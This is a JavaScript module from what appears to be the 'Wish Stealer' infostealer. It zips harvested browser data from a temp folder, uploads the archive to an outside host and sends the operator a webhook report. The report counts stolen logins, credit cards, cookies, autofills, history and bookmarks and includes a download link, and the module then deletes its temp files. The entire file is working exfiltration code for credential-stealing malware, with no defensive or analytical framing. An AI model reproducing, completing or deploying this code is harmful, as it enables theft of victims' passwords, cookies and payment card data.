const path = require('path');
const os = require('os');

const structures = require('../browsers/structures.js');

const requests = require('./../../utils/requests/requests.js');
const fileutil = require('./../../utils/fileutil/fileutil.js');

const BrowserStats = structures.BrowserStatistics;

module.exports = async (webhookUrl) => {
    const wishTempDir = path.join(os.tmpdir(), 'wish');
    const wishTempZip = path.join(os.tmpdir(), 'wish.zip');

    try {
        await fileutil.ZipDirectory({
            inputDir: wishTempDir,
            outputZip: wishTempZip
        })

        const link = await requests.Upload(wishTempZip);

        await requests.Webhook(webhookUrl, {
            embeds: [{
                title: 'Wish Stealer',
                description: '```' + BrowserStats.users.join(',\n') + '```',
                fields: [
                    {
                        name: 'Downloads',
                        value: '```' + BrowserStats.downloadsCount + '```',
                        inline: true,
                    },
                    {
                        name: 'Historys',
                        value: '```' + BrowserStats.historysCount + '```',
                        inline: true,
                    },
                    {
                        name: 'Book Marks',
                        value: '```' + BrowserStats.bookmarksCount + '```',
                        inline: true,
                    },
                    {
                        name: 'Auto Fills',
                        value: '```' + BrowserStats.autofillsCount + '```',
                        inline: true,
                    },
                    {
                        name: 'Logins',
                        value: '```' + BrowserStats.loginsCount + '```',
                        inline: true,
                    },
                    {
                        name: 'Credit Cards',
                        value: '```' + BrowserStats.credirCardsCount + '```',
                        inline: true,
                    },
                    {
                        name: 'Cookies',
                        value: '```' + BrowserStats.cookiesCount + '```',
                        inline: true,
                    },
                    {
                        name: 'Archive Link',
                        value: '[Download here](' + link + ')',
                        inline: false,
                    },
                ]
            }],
        });

        [wishTempDir, wishTempZip].forEach(async dir => {
            await fileutil.RemoveDir(dir);
        });
    } catch (error) {
        console.error(error);
    }
};